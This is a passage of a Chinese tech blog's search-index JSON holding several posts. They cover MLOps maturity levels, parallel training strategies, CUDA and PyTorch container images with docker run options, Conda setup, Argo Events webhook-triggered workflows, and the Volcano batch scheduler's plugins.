特征存储区：集中式存储区，标准化特征的定义、存储和访问。 元数据管理：记录流水线每次执行的信息，实现数据和工件沿袭、可重现性 机器学习流水线触发器：根据时间表或响应触发器自动执行流水线 6.3 级别 2：CI/CD 流水线自动化 适用场景：\n需要快速根据新的数据、新的业务环境训练模型 对模型迭代速度和质量有较高的要求 特性:\n源代码控制：管理流水线和组件的源代码 测试和构建服务：自动构建、测试和封装流水线及其组件 部署服务：自动部署流水线实现到目标环境 模型注册表：管理模型的不同版本 特征存储区和元数据存储区：提供特征和元数据管理 编排流水线：提供流水线编排能力 7. 参考 https://en.wikipedia.org/wiki/ModelOps https://cloud.google.com/architecture/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning?hl=zh-cn ","description":"","id":56,"section":"post","tags":["整理","机器学习","MLOps","大模型","研发","什么是"],"title":"什么是 MLOps","uri":"https://www.chenshaowen.com/blog/what-is-mlops.html"},{"content":"1. 数据并行 训练步骤:\nmaster 设备加载模型，并将模型参数复制到每个 worker 设备 master 设备按照 batch 维度划分训练数据，将每个 batch 传递给每个 worker 设备 每个 worker 设备进行训练 master 设备汇总每个 worker 设备的梯度，更新模型参数 master 设备广播模型参数到每个 worker 设备，准备下一个 batch 训练 核心思想:\n将训练数据按 batch 维度划分，分发到多个 worker 设备上并行计算，从而加速训练过程。每个 worker 完全复制了模型参数，独立进行前向和反向传播计算。最终通过单个 master 设备汇总所有 worker 的梯度，统一更新模型参数并广播回 worker。\n适用场景：\n大规模数据集的训练场景 特点：\n模型参数量相对较小，可在单 GPU 上加载 硬件资源要求相对较低，多 GPU 服务器即可 通信开销较小，主要是梯度同步 适合大多数 CV/NLP 任务的小模型训练 2. 张量并行 训练步骤:\n将模型的某些张量(如权重矩阵、激活值等)按行或列划分到不同的设备上 在前向传播时，每个设备计算被分配到本设备的那部分张量的运算 不同设备之间需要进行激活值的切分和集合操作，以传递部分结果给下一个处理设备 所有设备计算完成后，汇总每个设备的梯度，更新对应的模型张量参数。 将更新后的模型张量参数分发回各个设备，准备进行下一个 batch 的训练。 核心思想:\n将单个层或权重矩阵按行/列划分到不同的 worker 设备上并行计算。这是一种极细粒度的模型并行方式，可以最大化利用所有设备的计算能力，但同时也增加了大量的通信开销。不同 worker 需要频繁切分和集合中间激活值与梯度。\n适用场景：\n极大型模型，且单层参数量巨大的场景，GPT-3 等十亿参数量级的大语言模型 特点：\n需要集群提供大量 GPU 显存资源 通信开销最大，需频繁传递中间结果 要合理设计张量划分策略，降低开销 3. 流水线并行 特点:\n将整个模型按层划分为多个连续的阶段(stage)，每个阶段由一个设备负责计算。 在每个训练迭代开始时，第一个设备获取一个 batch 的输入数据，并执行前向计算。 第一个设备将计算出的中间激活值(activations)传递给第二个阶段的设备。 第二个设备接收到激活值后，基于这个输入继续执行前向计算，并将结果传递给下一个阶段，如此类推。 直到最后一个阶段完成前向计算，得到最终的输出。 基于输出，计算损失函数，并执行反向传播。 每个阶段在反向传播时，计算本阶段所需的梯度，并将上游梯度传递给前一个阶段。 所有阶段计算完成后，将各自的梯度汇总，更新对应的模型参数。 将更新后的模型参数分发到对应的设备，准备进行下一个 batch 的训练迭代。 核心思想:\n将模型划分为多个连续的阶段，每个阶段由一个 worker 设备负责。多个 worker 能同时参与计算不同 batch 的前向/反向传播，形成流水线式的并行，从而提高总体吞吐量。不同阶段需要在设备间切分传递激活值和梯度，实现了模型并行与流水线并行的融合。\n适用场景：\n适用于序列数据的长模型训练 特点:\n模型可相对较大，但每阶段占用显存较小 依赖集群提供足够设备资源 通信开销适中，主要在阶段切换时传递数据 合理划分阶段可最大化流水线并行效率 ","description":"","id":57,"section":"post","tags":["博文","AI","训练","模型"],"title":"模型并行训练技术","uri":"https://www.chenshaowen.com/blog/model-parallel-training-techniques.html"},{"content":"1. 镜像 Tag 标识的含义 base/cuda: 包括 CUDA 运行时\nruntime: 在 base 的基础上，新增了 CUDA math 库和 NCCL、cuDNN 运行时\ndevel: 在 runtime 的基础上，新增了头文件和用于构建 CUDA 镜像的开发工具，对于多阶段构建特别有用\ncuddn: 在上面基础上，新增了 cuDNN 神经网络加速库\npy3: Python 3 环境\n2. CUDA 镜像 镜像 AMD64 镜像大小 ARM64 镜像大小 nvidia/cuda:12.3.2-base-ubuntu22.04 87.01 MB 30.82 MB nvidia/cuda:12.3.2-runtime-ubuntu22.04 1.28 GB 1.23 GB nvidia/cuda:12.3.2-devel-ubuntu22.04 3.68 GB 3.14 GB nvidia/cuda:12.3.2-cudnn9-runtime-ubuntu22.04 1.91 GB 1.86 GB nvidia/cuda:12.3.2-cudnn9-devel-ubuntu22.04 4.31 GB 3.77 GB nvidia/cuda:12.3.2-base-ubuntu20.04 88.25 MB 32.56 MB nvidia/cuda:12.3.2-runtime-ubuntu20.04 1.28 GB 1.23 GB nvidia/cuda:12.3.2-devel-ubuntu20.04 3.66 GB 3.12 GB nvidia/cuda:12.3.2-cudnn9-runtime-ubuntu20.04 1.91 GB 1.86 GB nvidia/cuda:12.3.2-cudnn9-devel-ubuntu20.04 4.29 GB 3.75 GB 3. Pytorch 镜像 Pytorch 官方提供的 Pytorch 镜像。\n镜像 AMD64 镜像大小 pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime 3.44 GB pytorch/pytorch:2.2.2-cuda12.1-cudnn8-devel 8.47 GB 4. NVIDIA Pytorch 镜像 Nvidia 打包的 Pytorch 镜像，包含 cuda、cuBlas、cuDNN、OpenMPI、TensorRT 等包。\n镜像 pytorch 版本 OS cuda 驱动要求 AMD64 镜像大小 相关链接 hubimage/nvidia-pytorch:24.03-py3 2.3.0 Ubuntu 22.04 12.4 545+ 8.59 GB https://docs.nvidia.com/deeplearning/frameworks/pytorch-release-notes/rel-24-03.html hubimage/nvidia-pytorch:23.10-py3 2.1.0 Ubuntu 22.04 12.2 535+ 9.87 GB https://docs.nvidia.com/deeplearning/frameworks/pytorch-release-notes/rel-23-10.html 5. 运行镜像 挂载全部 GPU 卡 1 2 3 docker run --gpus all \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 指定 GPU 数量 1 2 3 docker run --gpus 3 \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 挂载指定 GPU 卡 1 2 3 docker run --gpus \u0026#39;\u0026#34;device=0,1\u0026#34;\u0026#39; \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 除了使用 GPU 的编号，还可以使用 UUID。UUID 可以通过 nvidia-smi -L 查询。\n设置共享内存 shm 1 2 3 4 docker run --gpus all \\ --shm-size=64g \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 设置系统资源限制 1 2 3 4 docker run --gpus all \\ --ulimit memlock=-1 --ulimit stack=67108864 \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 使用 Host IPC 1 2 3 4 docker run --gpus all \\ --ipc=host \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 挂载当前目录到容器的 /workspace 1 2 3 4 docker run --gpus all \\ -v \u0026#34;$PWD\u0026#34;:/workspace \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 设置 CPU、Memory 限制 1 2 3 4 docker run --gpus all \\ --cpus=2 --memory=4g \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 以特权模式运行 1 2 3 4 docker run --gpus all \\ --privileged \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash 值得注意的是，Docker 特权模式启动的容器，能使用所有 GPU 资源，导致 --gpus 指定的设备列表无效。\n最大化资源启动 1 2 3 4 5 6 7 docker run --gpus all \\ --ulimit memlock=-1 --ulimit stack=67108864 \\ -v \u0026#34;$PWD\u0026#34;:/workspace \\ --privileged \\ --shm-size=64g \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime bash ","description":"","id":58,"section":"post","tags":["博文","AI","镜像","容器"],"title":"常用 AI 基础镜像及启动命令","uri":"https://www.chenshaowen.com/blog/common-ai-base-images-and-run-command.html"},{"content":"1. 安装 conda 1 2 3 wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh bash Miniconda3-latest-Linux-x86_64.sh rm -rf Miniconda3-latest-Linux-x86_64.sh 但 Miniconda 不能免费大规模商用，可以使用 Miniforge 平替。\n1 2 wget \u0026#34;https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname -m).sh\u0026#34; bash Miniforge3-$(uname)-$(uname -m).sh 2. 修改默认配置 2.1 初始化 Shell 如果不进行初始化，激活环境时会报错 CondaError: Run 'conda init' before 'conda activate' 。\n1 2 3 4 5 6 7 8 9 conda init --help usage: conda init [-h] [--all] [--user] [--no-user] [--system] [--reverse] [--json] [-v] [-q] [-d] [SHELLS ...] Initialize conda for shell interaction. positional arguments: SHELLS One or more shells to be initialized. If not given, the default value is \u0026#39;bash\u0026#39; on unix and \u0026#39;cmd.exe\u0026#39; \u0026amp; \u0026#39;powershell\u0026#39; on Windows. Use the \u0026#39;--all\u0026#39; flag to initialize all shells. Available shells: [\u0026#39;bash\u0026#39;, \u0026#39;fish\u0026#39;, \u0026#39;powershell\u0026#39;, \u0026#39;tcsh\u0026#39;, \u0026#39;xonsh\u0026#39;, \u0026#39;zsh\u0026#39;] 针对不同 Shell 终端，需要执行不同的初始化命令。\nzsh 1 conda init zsh bash 1 conda init bash 执行初始化的目的是，让 Shell 启动会话时自动执行 Conda 的初始化脚本、配置环境变量。\n2.2 修改 Conda 包存储的位置 编辑 .condarc 文件，添加配置 1 vim ~/.condarc 1 2 3 4 pkgs_dirs: - /Volumes/Data2/Conda/packages envs_dirs: - /Volumes/Data2/Conda/environments 这里将默认路径改为 /Volumes/Data2/Conda 目录下，避免占用系统盘空间。\n查看配置信息 1 conda config --show 2.3 使用国内镜像源 编辑 .condarc，添加国内镜像源 1 vim ~/.condarc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 channels: - defaults show_channel_urls: true default_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch-lts: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud deepmodeling: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/ 3. 环境管理 新建环境 1 conda create -n newenv python=3.9 查看环境列表 1 2 3 4 5 6 conda env list # conda environments: # newenv /Volumes/Data2/Conda/environments/newenv base /usr/local/Caskroom/miniconda/base 激活环境 1 conda activate newenv 退出环境 1 conda deactivate 删除环境 1 conda remove -n newenv --all 4. 包管理 搜索包 1 conda search pytorch 安装包 1 conda install pytorch==2.2.0 从指定渠道安装包 1 conda install pytorch==2.2.0 torchvision==0.17.0 torchaudio==2.2.0 pytorch-cuda=12.1 -c pytorch -c nvidia 针对国内源找不到的包，可以通过 -c 指定渠道安装。\n查看包 1 conda list 更新包 1 conda update pytorch 删除包 1 conda remove pytorch 安装 requirements.txt 包 1 conda install --file requirements.txt ","description":"","id":59,"section":"post","tags":["博文","Conda","Python","Ai"],"title":"Conda 安装与使用","uri":"https://www.chenshaowen.com/blog/conda-install-and-use.html"},{"content":"1. Argo Events 工作原理 上面是 Argo Events 官方网站上的架构图，对于事件处理系统，有三个重要的组成\n事件源的接入，对应于 Event Source 事件的分发，对应于 Event Sensor 事件的消费，对应于 Event Trigger 事件消息存储在 EventBus 中，默认使用的 NATS。\n2. 创建 ServiceAccount 给 Sensor 和 Workflow 创建 operate-workflow-sa operate-workflow-sa 用来授权 Sensor 操作 Workflow 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: ServiceAccount metadata: namespace: argo-events name: operate-workflow-sa --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: operate-workflow-role namespace: argo-events rules: - apiGroups: - argoproj.io verbs: - \u0026#34;*\u0026#34; resources: - workflows --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: operate-workflow-role-binding namespace: argo-events roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: operate-workflow-role subjects: - kind: ServiceAccount name: operate-workflow-sa namespace: argo-events EOF 创建 workflow-pods-sa workflow-pods-sa 用来授权 Workflow 操作 Pod。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: ServiceAccount metadata: namespace: argo-events name: workflow-pods-sa --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: namespace: argo-events name: workflow-pods-role rules: - apiGroups: - \u0026#34;\u0026#34; verbs: - \u0026#34;*\u0026#34; resources: - pods --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: namespace: argo-events name: workflow-pods-role-binding roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: workflow-pods-role subjects: - kind: ServiceAccount name: workflow-pods-sa namespace: argo-events EOF 值得注意的是 operate-workflow-sa 和 workflow-pods-sa 都是命名空间级别，在不同的命名空间下，需要分别授权。\n3. 创建一个 eventbus 存储事件 创建一个 NATS 1 2 3 4 5 6 7 8 9 10 11 12 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: argoproj.io/v1alpha1 kind: EventBus metadata: name: default namespace: argo-events spec: nats: native: replicas: 3 auth: token EOF 查看负载 1 2 3 4 5 kubectl -n argo-events get pod | grep eventbus eventbus-default-stan-0 2/2 Running 0 95s eventbus-default-stan-1 2/2 Running 0 93s eventbus-default-stan-2 2/2 Running 0 92s 4. 创建一个 API 触发的 webhook 创建一个 webhook API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: argoproj.io/v1alpha1 kind: EventSource metadata: name: myproject-webhook namespace: argo-events spec: eventBusName: default service: ports: - port: 80 targetPort: 80 webhook: myproject-start: endpoint: /myproject/start method: POST port: \u0026#34;80\u0026#34; url: \u0026#34;\u0026#34; 这里在 80 端口，/myproject/start 路径下，创建了一个 POST 请求的接口，用于触发事件。如果有多个 APi 定义，可以继续添加在 spec.webhook 下。\n查看负载 1 2 3 kubectl -n argo-events get pod | grep myproject myproject-webhook-eventsource-4ws29-697b776fb7-6n9dx 1/1 Running 0 26s Argo Events 会给每个 EventSource 创建一个 pod，用于接收事件; 创建一个 Service 作为触发事件的入口。\n1 2 3 kubectl -n argo-events get svc | grep myproject myproject-webhook-eventsource-svc ClusterIP 10.96.129.232 \u0026lt;none\u0026gt; 80/TCP 26s 暴露服务 为了方便待会儿测试，这里将 Service 服务的 type 设置为 NodePort。\n1 kubectl patch svc myproject-webhook-eventsource-svc -n argo-events -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;}}\u0026#39; 1 2 3 kubectl -n argo-events get svc | grep myproject myproject-webhook-eventsource-svc NodePort 10.96.129.232 \u0026lt;none\u0026gt; 80:30001/TCP 14h 5. 创建一个 sensor 用于处理事件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: argoproj.io/v1alpha1 kind: Sensor metadata: name: myproject-start namespace: argo-events spec: template: serviceAccountName: operate-workflow-sa dependencies: - name: myproject-start eventSourceName: myproject-webhook eventName: myproject-start triggers: - template: name: webhook-workflow-trigger argoWorkflow: group: argoproj.io version: v1alpha1 resource: workflows operation: submit source: resource: apiVersion: argoproj.io/v1alpha1 kind: Workflow metadata: generateName: webhook- spec: serviceAccountName: workflow-pods-sa ttlStrategy: secondsAfterCompletion: 600 secondsAfterSuccess: 600 secondsAfterFailure: 600 entrypoint: whalesay arguments: parameters: - name: message - name: who templates: - name: whalesay inputs: parameters: - name: message value: \u0026#34;hello(input)\u0026#34; - name: who value: \u0026#34;world(input)\u0026#34; container: image: docker/whalesay:latest command: [cowsay] args: [ \u0026#34;{{inputs.parameters.message}} {{inputs.parameters.who}}\u0026#34;, ] parameters: - src: dataTemplate: \u0026#34;{{ .Input.body.message }}\u0026#34; dependencyName: myproject-start dest: spec.arguments.parameters.0.value - src: dataTemplate: \u0026#34;{{ .Input.body.who }}\u0026#34; dependencyName: myproject-start dest: spec.arguments.parameters.1.value EOF 此时，Argo Events 也会创建一个 Pod 用于处理事件。\n1 2 3 kubectl -n argo-events get pod | grep sensor myproject-start-sensor-pzkf9-658cbd5c7d-xv9zf 1/1 Running 0 56s 这里有几个配置需要注意:\n1 2 3 4 dependencies: - name: myproject-start eventSourceName: myproject-webhook eventName: myproject-start 应该与 EventSource 中的定义关联，这样才能接收事件。\n1 operation: submit 如果 operation 是 create，那么 parameters 中获取到的会是一个完整的事件描述，数据采用 Base64 编码。如果 operation 是 submit，那么 parameters 中获取到的会是一个 payload，能直接使用。\n1 2 3 4 ttlStrategy: secondsAfterCompletion: 600 secondsAfterSuccess: 600 secondsAfterFailure: 600 Workflow 在执行完成之后，并不会立即删除，而是根据 ttlStrategy 的定义进行删除。\n1 entrypoint: whalesay entrypoint 是指定 Workflow 执行的入口，如果不指定，则默认为 main，即 spec.entrypoint 的值。\n1 2 3 4 5 6 7 8 9 parameters: - src: dataTemplate: \u0026#34;{{ .Input.body.message }}\u0026#34; dependencyName: myproject-start dest: spec.arguments.parameters.0.value - src: dataTemplate: \u0026#34;{{ .Input.body.who }}\u0026#34; dependencyName: myproject-start dest: spec.arguments.parameters.1.value dataTemplate 用于指定依赖的事件数据，dest 用于指定 Workflow 中的参数，dependencyName 用于指定依赖的事件的名字。这里是用于将 API Body 中的参数提取出来，传递给 Workflow 中的参数，覆盖掉默认值。\n6. 调用 API Webhook 触发事件 调用 API 接口触发 1 curl -d \u0026#39;{\u0026#34;message\u0026#34;:\u0026#34;hello\u0026#34;, \u0026#34;who\u0026#34;: \u0026#34;world\u0026#34;}\u0026#39; -H \u0026#34;Content-Type: application/json\u0026#34; -X POST http://localhost:30001/myproject/start -v 查看创建的 Workflow 1 2 3 4 kubectl -n argo-events get workflows NAME STATUS AGE MESSAGE webhook-5z7k5 Succeeded 119s 查看 Workflow 的日志 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kubectl -n argo-events logs webhook-5z7k5 -f _____________ \u0026lt; hello world \u0026gt; ------------- \\ \\ \\ ## . ## ## ## == ## ## ## ## === /\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;___/ === ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ / ===- ~~~ \\______ o __/ \\ \\ __/ \\____\\______/ 触发成功，符合预期。\n7. 使用 WorkflowTemplate 创建 Workflow 每次将全部定义放在 Workflow 的 templates 中非常繁琐，Argo 提供了 WorkflowTemplate 用于编排 Workflow。\n创建 WorkflowTemplate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: argoproj.io/v1alpha1 kind: WorkflowTemplate metadata: name: whalesay-template namespace: argo-events spec: templates: - name: whalesay inputs: parameters: - name: message container: image: docker/whalesay command: [cowsay] args: [\u0026#34;{{inputs.parameters.message}}\u0026#34;] --- apiVersion: argoproj.io/v1alpha1 kind: WorkflowTemplate metadata: name: congratulations-template namespace: argo-events spec: templates: - name: congratulations container: image: shaowenchen/demo-ubuntu command: [sh, -c] args: [\u0026#34;echo Congratulations!\u0026#34;] --- apiVersion: argoproj.io/v1alpha1 kind: WorkflowTemplate metadata: name: random-status-template namespace: argo-events spec: templates: - name: random-status script: image: python:alpine3.6 command: [python] source: | import random exit_code = 0 if random.choice([True, False]) else 1 import sys sys.exit(exit_code) EOF 这里定义了三个 WorkflowTemplate，分别是 whalesay-template 打印输入参数，congratulations-template 打印固定字符串，random-status-template 产生随机的状态。\n创建 Workflow 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: argoproj.io/v1alpha1 kind: Workflow metadata: name: combined-workflow namespace: argo-events spec: entrypoint: combined-template serviceAccountName: workflow-pods-sa templates: - name: combined-template steps: - - name: whalesay templateRef: name: whalesay-template template: whalesay arguments: parameters: - name: message value: hello world - - name: congratulations templateRef: name: congratulations-template template: congratulations 现在的 Workflow 看起来就简单了许多，因为每个任务具体的操作定义在 WorkflowTemplate 中，Workflow 中只需要指定 WorkflowTemplate 的名称和参数即可。\n8. 复杂依赖编排 DAG Workflow 普通的 Workflow 只能用于任务的顺序执行，而 DAG Workflow 可以处理复杂的任务依赖和状态依赖，对任务进行编排。下面提供一个例子:\n创建 DAG Workflow 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 apiVersion: argoproj.io/v1alpha1 kind: Workflow metadata: name: status-workflow namespace: argo-events spec: entrypoint: dag serviceAccountName: workflow-pods-sa templates: - name: dag dag: tasks: - name: whalesay templateRef: name: whalesay-template template: whalesay arguments: parameters: - name: message value: hello world - name: check-status templateRef: name: random-status-template template: random-status dependencies: [whalesay] continueOn: failed: true - name: success-path templateRef: name: whalesay-template template: whalesay arguments: parameters: - name: message value: success-path dependencies: [check-status] when: \u0026#34;{{tasks.check-status.status}} == \u0026#39;Succeeded\u0026#39;\u0026#34; - name: failure-path templateRef: name: whalesay-template template: whalesay arguments: parameters: - name: message value: failure-path dependencies: [check-status] when: \u0026#34;{{tasks.check-status.status}} == \u0026#39;Failed\u0026#39;\u0026#34; 这里定义了一个 DAG Workflow:\n先执行 whalesay check-status 会等待 whalesay 执行完毕，随机产生一个状态 如果状态为成功，则会执行 success-path，否则会执行 failure-path 查看负载 1 2 3 4 5 kubectl get pod -n argo-events |grep status status-workflow-random-status-2060967154 0/2 Error 0 40s status-workflow-whalesay-261193263 0/2 Completed 0 60s status-workflow-whalesay-437390993 0/2 Completed 0 30s status-workflow-random-status-2060967154 产生了错误的随机状态，因此会执行 failure-path。\n查看 Workflow 的状态 1 2 3 4 kubectl get workflow -n argo-events NAME STATUS AGE MESSAGE status-workflow Failed 56s 由于有任务执行失败，Workflow 会被标记为 Failed。\n9. 总结 最近需要结合 Argo 给 AI Infra 做一个工作流，本篇主要是对 Argo Events\\Workflow 学习相关的一些笔记，主要内容如下:\n介绍 Argo Events 工作原理 一个基于 webhook 触发 Workflow 的示例 一个基于 WorkflowTemplate 编排 Workflow 的示例 一个基于 WorkflowTemplate 编排 DAG Workflow 的示例 在 Argo 中还有一个与 WorkflowTemplate 非常类似的对象 ClusterWorkflowTemplate, 即集群级别的 WorkflowTemplate，在每个命名空间下都可以复用。\n对于平台方，Argo 主要有两大能力：\n快速集成功能，基于 EventSource - Sensor - Workflow 进行事件触发，快速用 yaml 堆砌 API 功能 Workflow 编排，基于 ClusterWorkflowTemplate 来编排 Workflow，提供上层编排的能力 下面是我的一个建模:\nClusterWorkflowTemplate 对应 Plugin, Workflow 对应 Pipeline。虽然 Workflow 一旦被创建就会被立即执行，但业务系统通常都有自己的数据库，我们只需要将 Workflow 暂存在数据库中，当运行时下发到 Argo 中即可执行流水线。\n","description":"","id":60,"section":"post","tags":["博文","CD","Events","Pipeline","Argo"],"title":"Argo Events 事件驱动工作流","uri":"https://www.chenshaowen.com/blog/event-driven-workflow-using-argo-events.html"},{"content":"1. Volcano 简介 Volcano 是华为开源的一个基于 Kubernetes 的资源调度系统，相较于原生的调度器，具有的显著特点有：\n支持 gang scheduling 对于批量作业的调度，容易碰到死锁的问题，比如两个作业都需要同时运行 10 个 Pod 才能启动，当两个作业同时提交时，可能都只有部分 Pod 被调度，两个作业都无法正常运行，而处于互相等待状态。gang scheduling 就是为了解决这个问题。\n调度队列 配置不同的调度队列，能够实现对资源的抢占、配额的控制等。\n硬件感知 Numa、GPU 等硬件资源的感知，能够让 Pod 对硬件资源更高效的使用。\nVolcano 是在 Kubernetes 原生调度能力的基础上进行的扩展和优化，因此，对于基本的 nodeSelector 、nodeAffinity 等也是支持的。同时也支持 Extended Resource，这点对于 GPU、IB 网卡等资源的在调度层面的感知非常重要。\n2. 安装 添加 Helm Repo 1 helm repo add volcano-sh https://volcano-sh.github.io/helm-charts 安装指定版本 1 helm install volcano volcano-sh/volcano -n volcano-system --create-namespace --version 1.8.2 3. 相关 CRD 列表 1 2 3 4 5 6 7 8 9 kubectl get crd |grep volcano commands.bus.volcano.sh 2024-03-21T03:41:33Z jobflows.flow.volcano.sh 2024-03-21T03:41:33Z jobs.batch.volcano.sh 2024-03-21T03:41:33Z jobtemplates.flow.volcano.sh 2024-03-21T03:41:33Z numatopologies.nodeinfo.volcano.sh 2024-03-21T03:41:33Z podgroups.scheduling.volcano.sh 2024-03-21T03:41:33Z queues.scheduling.volcano.sh 2024-03-21T03:41:33Z commands.bus.volcano.sh 用于与 Volcano 系统交互。它允许用户通过创建 Command 对象来触发特定的操作，如暂停/恢复作业、重新调度等。\njobflows.flow.volcano.sh JobFlow 对象描述了多个作业之间的执行依赖关系。\n常见的用例是数据处理流水线，通过 Jobflow 可以自动根据依赖关系正确编排作业执行顺序。\njobs.batch.volcano.sh Job 是 Volcano 最核心的资源对象，用于提交和运行批处理作业。它支持多种工作负载类型，如单个 Job、Job 数组、周期性作业等。\nJob 还可以挂载数据卷、配置资源需求等。\njobtemplates.flow.volcano.sh JobTemplate 为创建相似的作业提供了模板机制。用户只需定义一次作业的规格，就可以根据模板快速方便地创建多个实例。\n特别适合需要同时运行数十或数百个相似作业的场景，大幅降低管理和运维成本。\nnumatopologies.nodeinfo.volcano.sh NumaTopology 对象用于描述节点的 Numa 信息。\npodgroups.scheduling.volcano.sh PodGroup 对象将多个 Pod 作为一个整体进行调度。\n当需要多个 Pod 同时运行时，可以使用 PodGroup 对象。\nqueues.scheduling.volcano.sh Queue 对象用于定义作业队列，实现资源隔离和公平调度。\n在多租户场景下，不同团队或部门可以根据需要创建自己专属的队列，并为队列设置资源配额和优先级参数。通过队列可以避免互相影响,实现可预测和可控的资源分配。\n4. Job Pluings 定制 Pod 运行 4.1 常用的三种插件 Volcano 提供了一些内置的 plugins，如果想要自定义开发插件，需要根据源码 https://github.com/volcano-sh/volcano/tree/master/pkg/controllers/job/plugins 实现 PluginInterface 接口。下面是一个示例:\n1 2 3 4 5 6 7 8 9 apiVersion: batch.volcano.sh/v1beta1 kind: Job metadata: name: my-job spec: plugins: ssh: [] env: [] svc: [] 这些插件能够实现一些定制化的需求:\nssh 插件 配置 Pod 之间的 SSH 互信，提供免密登录\nsvc 插件 提供作业运行所需要的网络信息如 hosts 文件、headless service 等 ，来提供计算集群参数的自动化配置\nenv 插件 提供作业运行所需要的环境变量\n4.2 注入原理 env 插件注入的是 VK_TASK_INDEX 、VC_TASK_INDEX。 注入原理:\n1 2 3 4 5 6 7 spec: containers: - env: - name: VK_TASK_INDEX value: \u0026#34;0\u0026#34; - name: VC_TASK_INDEX value: \u0026#34;0\u0026#34; 插件从 Pod 名字中获取到索引值，然后直接设置到 env 中。\nsvc 插件注入的是 VC_DEMO_NUM、VC_DEMO_HOSTS 注入原理:\n1 2 3 4 5 6 7 8 9 10 11 12 13 spec: containers: - env: - name: VC_DEMO_HOSTS valueFrom: configMapKeyRef: key: VC_DEMO_HOSTS name: my-plugins-job-svc - name: VC_DEMO_NUM valueFrom: configMapKeyRef: key: VC_DEMO_NUM name: my-plugins-job-svc 1 2 3 4 kubectl get cm my-plugins-job-svc NAME DATA AGE my-plugins-job-svc 3 15m 在 my-plugins-job-svc 中存储了 VC_DEMO_NUM 和 VC_DEMO_HOSTS 的值。\nssh 插件注入 ssh 访问的公钥、私钥 注入原理:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 spec: containers: volumes: - name: my-plugins-job-ssh secret: defaultMode: 384 items: - key: id_rsa path: .ssh/id_rsa - key: id_rsa.pub path: .ssh/id_rsa.pub - key: authorized_keys path: .ssh/authorized_keys - key: config path: .ssh/config secretName: my-plugins-job-ssh 1 2 3 4 kubectl get secret my-plugins-job-ssh NAME TYPE DATA AGE my-plugins-job-ssh Opaque 4 22m 在 my-plugins-job-ssh 中存储了 ssh 公钥和私钥，Volcano 会将秘钥挂载到 Pod 中。\n4.3 测试 Plugins 创建一个多个 Pod 同时运行的 Job 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - 